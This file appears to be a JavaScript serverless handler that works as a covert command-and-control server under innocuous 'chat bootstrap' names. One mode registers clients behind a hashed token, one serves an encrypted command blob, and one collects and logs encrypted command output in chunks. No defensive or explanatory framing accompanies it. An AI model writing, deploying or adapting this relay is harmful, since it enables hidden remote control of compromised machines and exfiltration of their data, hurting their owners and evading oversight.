import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '44';
const CONTROL_PAYLOAD = 'U2FsdGVkX18Gw4LmSUOm5U0yOIPYCRpWOsokVL2ppxHuWXzj2nHZ4c7dyPUlXqx22/4jHfVJDID9paogPONbODIophAtHW9rWDr3rWtfRdqEkDEstqaLNe6iG0IPOa2LBgQWTZbcYWm4+Vn1AKfEQyr5Nz7vfoVHy8JoI34fQk5PctEbUFh0fkeo6LvsE/Rvud37IImVGRdLp0FVlio3JbMBydTsbMRDttNxcE4qwxfKfeo+PKDRFTcasD1Xox55OT0YQ97n/jFfdL7HX3Mg65TXMFIvhQ97r+bqU7VngTblTWlFf1taWhUxkULKw8qVOaJV+O+ZiHLh8rZnjmXyPSygWZLYa+bo9xHdog3UTf6hIo/+b93ZFAS00hwTuTSWsL/p/B9H+BL2cZzXQJwe5EasJNSHSToHM4y2mj1YOx3jIRvlJYIFTSX+wVWnLDHxbux9HZOm/PiZW4aukFO83MaFLbvhRMaBiF6AzyMvQ+3wy3FqzS9I4suSzsxhbNe57bm1XBXHj0VEXIT1qfNzsGLO892XWtpO1TmQjf1DAvfl56pMGNRjwbyZXT+Y2/f4bNhwD9yoYgj2wwANF3EdD3gca/myyQF70mSkOyH7wlOTbMgkzHQUw8YdF20sBJ6sL5z1tZQJwp7Uqnca31boz7uZbOH5dmxn5lWzZ/H6yqF16o+14H7LH0brWxdOxide3f8IBf0m6h1yqoFZcxVJw4MB7TmLwacWf0yldD7+3F8s1H8C6Yay34+alUkrSznF/8klZNYzJWNVLJPsGiFO3ARPODMUe/hJX0OMaVqFiPKxCiF56VeLIEseIjeyZetPv/F1asBNmDz4bugpD/m9tv7ayRi1/YJY5LisLlxosBuN/yGg2GsSzpDBs8619/2TMy6FrI2tZqvQvmwFjk5A5HU4Robn5z7xUVF8wc7x47MgVqMwaLGDsvlYKnIjH3U72Xt+x+hyoVkt1W7rZZ/wl/LnEep6JNLEHg8e/+260ITNmkHiH27ssBTPLAh+SgWgurmoOzDOZ1ADQT9h8dyInYwdNTEulDmm6F7y0jQFAJme69fv0FuX6SYD0+cm9wQPvYFqDG6bCQsRlquLMEUAKyn3X6JkWJKKOtpWMAlkumsxoG7e/QhVMXECSoXC03BQv7wl9uM6yWYcSA7easJwHlxgWNQe4kEwNUS4FIgPiEDO2H+LbXCXk4BknhK5OVSO4hiPZXlhkyxbK/30bU4TXfjXJT+zhHZ1DCZBHv9nk6YJFU/wUFu5UVa+d93M6Pt7FRxz4cV1msyEZ5hZ43Kq5d/VZhVJFeZRaRmkORZSQsUL+SUGNR92kBbMl8hM9puuYXk7c6dli5tOQahURHvQMZ5wFJK7rXCPWqtCDfogbK4d/9QVJtuE9g2daaYefeEipZZ5jwSso5F/Sc97iPcR8tqPAOI8Uq09LaoCcaEVtFZG2y2Hpy6Yn67Y8c3MndsNUT4U1cbn0z6KlSFRxgvwKHXsrw44HMvOGt0A2ip+TLBW72uE1Pvtv2DC9m9JnN3yZKW5yA5MNenxaFSrA5P7wQk6dMYc5/Hj8ee8rbBUg1YtVNUGvIGzEU7/oWxgEpNSBco3lUCv4ah/F1UI41bXa8rAClC0/qO/LfgECYI5A5V9UX+B0V1jFu5N3FxCMJbKHr7kE2UZCgOXd75CWXUNhpiGMMpa/mxPyBLR+xx1FvlP6/UAcqdbrtVpRSQHJUz09LGMuT/sgec/AerM5Pb3c1LORGEGgsbHT76TVILAEeFdYAjpO0CMu5Hs258WEk0BNJquIY7MRmJlOpOA6zOmX5lq6YA2EhDPDy7Rw7RRI/RjpHeaOn8+U+/lTudz2lsHKqSnmipEImu6TALjHBS2KQm7fcXz5j5EUnhMvP8Xcf5+PSnobuNe/DISGfPS10awfGx1NYEqEQqz819+4YxKUYEVo8nkzGwEO5UfeV14NU09FS7xMzw2VeHHIFPRyMLY';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
